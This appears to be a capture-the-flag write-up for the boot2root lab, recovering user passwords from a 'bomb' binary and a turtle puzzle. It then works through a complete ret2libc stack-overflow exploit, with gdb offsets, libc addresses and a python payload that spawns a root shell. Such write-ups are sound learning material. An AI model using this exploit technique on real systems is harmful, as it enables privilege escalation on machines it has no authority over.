It's Good.

Result: `4 2 6 3 1 5`

All the values are:

- `Public speaking is very easy.`
- `1 2 6 24 120 720`
- `0 q 777`
- `9`
- `opukmq`
- `4 2 6 3 1 5`

```
$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
0 q 777
Halfway there!
9
So you got that one.  Try this one.
opukmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

The password for the user `thor` is all the values without spaces :

`Publicspeakingisveryeasy.126241207200q7779opukmq426315`

Ok... There is an error in the subject, need to inverse the last numbers...

`Publicspeakingisveryeasy.126241207200q7779opukmq426135`

Doesn't work... Let's try with other combinaisons for the phase_3 part, there are 8 possibilities

The good one was `1 b 214`

`Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## Thor

There is 2 files

```
$ ls
README  turtle

$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

The file `turtle` is a sequence of steps to reproduce. It's a famous method to learn programming

Let's write a python script to parse the file et draw the instructions.

We can see the word `SLASH` appears. The password doesn't work for the user `zaz`

The password is the md5sum of the word `SLASH`

`646da671ca01bb5d84dbb5fb2238dc8e`

## Zaz

There is a binary file `exploit_me` and a directory `mail`

```
$ ls
exploit_me  mail

$ ls -la mail
total 1
drwxr-x--- 3 zaz zaz 107 Oct  8  2015 .
drwxr-x--- 4 zaz zaz 147 Oct 15  2015 ..
drwxr-x--- 5 zaz zaz  99 Oct  8  2015 .imap
-rwxr-x--- 1 zaz zaz  36 Oct  8  2015 .subscriptions
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Drafts
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Sent
-rwxr-x--- 1 zaz zaz   0 Oct  8  2015 INBOX.Trash
```

Nothing clear to read in the mail directory. Let's exploit the binary

```
$ ./exploit_me 
$ ./exploit_me coucou
coucou
$ ./exploit_me coucou coucou
coucou
```

The program print the first argument

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	    push   ebp
   0x080483f5 <+1>:	    mov    ebp,esp
   0x080483f7 <+3>:	    and    esp,0xfffffff0
   0x080483fa <+6>:	    sub    esp,0x90
   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    eax,0x1
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    eax,0x0
   0x08048436 <+66>:	leave  
   0x08048437 <+67>:	ret    
End of assembler dump.
```

There is a strcpy, try to overflow

```
(gdb-peda)$ pattern create 200 file
Writing pattern of 200 chars to filename "file"

(gdb-peda)$ r $(cat file)
Starting program: /home/nico/42/boot2root/zaz/exploit_me $(cat file)
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fa0000 --> 0x1e4d6c 
EDI: 0xf7fa0000 --> 0x1e4d6c 
EBP: 0x41514141 ('AAQA')
ESP: 0xffffd430 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd430 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffd434 ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffd438 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffd43c ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffd440 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffd444 ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffd448 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffd44c ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
```

We have an overflow, find the offset to overwrite EIP

```
(gdb-peda)$ pattern search
Registers contain pattern buffer:
...
EIP+0 found at offset: 140
...
```

The offset to overflow is 140, try it

```
(gdb-peda)$ r $(python2 -c 'print "A"*140+"BBBB"')
Starting program: /home/nico/42/boot2root/zaz/exploit_me $(python2 -c 'print "A"*140+"BBBB"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
...
EIP: 0x42424242 ('BBBB')
....
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```

Yes!

Verify the protections

```
$ checksec --file=exploit_me 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66) Symbols	  No	0		1		exploit_me
```

No protections, now check ASLR

```
$ cat /proc/sys/kernel/randomize_va_space
0
```

No ASLR, go exploit with a ret2libc like a warrior. For this, we need the addresses of the function `system`, `exit` and a string `/bin/sh`

```
(gdb) info proc map
process 2673
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

The address of `"/bin/sh"` is `0xb7f8cc58`

```
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xb7e6b060  __libc_system
0xb7e6b060  system
0xb7f49550  svcerr_systemerr
```

The address of the fucntion system is `0xb7e6b060`

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xb7e5ebe0  exit
0xb7e5ec10  on_exit
0xb7e5ee20  __cxa_atexit
0xb7e5efc0  quick_exit
0xb7e5eff0  __cxa_at_quick_exit
0xb7ee41d8  _exit
0xb7f28500  pthread_exit
0xb7f2dc10  __cyg_profile_func_exit
0xb7f4c750  svc_exit
0xb7f56c80  atexit
```

The address of the function exit is `0xb7e5ebe0`

We have all the informations, now build the payload

```
140 offset + system + JUNK = exit + /bin/sh


"A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
```

Exploit!

```
$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
# whoami
root
```

We are root! Script it now
